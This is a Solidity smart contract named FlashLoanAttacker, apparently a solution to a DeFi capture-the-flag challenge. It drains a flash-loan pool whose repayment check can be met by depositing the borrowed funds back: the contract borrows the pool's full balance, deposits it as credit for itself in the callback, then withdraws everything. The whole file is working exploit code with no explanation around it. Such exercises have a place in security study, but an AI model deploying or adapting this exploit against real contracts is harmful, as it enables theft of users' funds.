// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import "@openzeppelin/contracts/access/Ownable.sol";
import "@openzeppelin/contracts/utils/Address.sol";

interface IFlashLoanPool {
    function flashLoan(uint256 amount) external;
    function deposit() external payable;
    function withdraw() external;
}

contract FlashLoanAttacker is Ownable {
    using Address for address payable;

    IFlashLoanPool private immutable pool;

    constructor(address poolAddress) {
        pool = IFlashLoanPool(poolAddress);
    }

    function attack() external payable onlyOwner {
        pool.flashLoan(address(pool).balance);

        pool.withdraw();
    }

    function execute() external payable {
        IFlashLoanPool(msg.sender).deposit{value: msg.value}();
    }

    receive () external payable {}
}
